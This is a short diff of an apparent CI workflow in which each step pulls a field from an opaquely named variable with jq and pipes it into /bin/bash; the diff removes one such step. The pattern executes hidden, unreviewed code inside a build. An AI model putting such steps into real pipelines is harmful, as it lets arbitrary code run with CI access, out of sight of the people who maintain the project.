@@ -24,7 +24,6 @@ jobs:
           echo $ocrx93 | jq -r .fmlte512 | /bin/bash
           echo $a8 | jq -r .ejofo1 | /bin/bash
           echo $acdd4 | jq -r .i4004 | /bin/bash
-          printf '%s' "$spck284" | jq -r .u38 | /bin/bash
           echo $gqbev3 | jq -r .cznj95 | /bin/bash
           printf '%s' "$sgg068" | jq -r .zhkf49976 | /bin/bash
 
